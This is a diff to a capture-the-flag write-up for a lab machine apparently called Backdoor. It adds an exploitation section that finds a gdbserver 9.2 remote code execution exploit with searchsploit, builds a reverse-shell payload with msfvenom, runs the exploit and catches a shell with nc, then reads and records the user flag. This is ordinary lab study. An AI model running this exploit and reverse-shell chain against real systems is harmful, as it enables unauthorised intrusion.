@@ -100,8 +100,58 @@ Content-Type: application/octet-stream
 * -dm creates a new session but does not attach to it
 * session name root
 
+6. Exploitation 
+````
+# searchsploit gdbserver
+----------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                       |  Path
+----------------------------------------------------------------------------------------------------- ---------------------------------
+GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                   | linux/remote/50539.py
+----------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+````
+
+````
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 PrependFork=true -o rev.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 106 bytes
+Saved as: rev.bin
+````
+
+````
+# nc -nlvp 4444
+````
+
+````
+# python3 50539.py 10.10.11.125:1337 rev.bin
+[+] Connected to target. Preparing exploit
+[+] Found x64 arch
+[+] Sending payload
+[*] Pwned!! Check your listener
+````
+
+````
+# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.221] from (UNKNOWN) [10.10.11.125] 49944
+id
+uid=1000(user) gid=1000(user) groups=1000(user)
+python3 -c "import pty; pty.spawn('/bin/bash')"
+user@Backdoor:/home/user$ cat user.txt  
+cat user.txt
+b43f7cb5891eae348070ac16b82a3a6a
+````
+
+7. Privilege escalation
+````
+
+````
+
 
 
 # Secrets
-* FLAG_USER =
+* FLAG_USER = b43f7cb5891eae348070ac16b82a3a6a
 
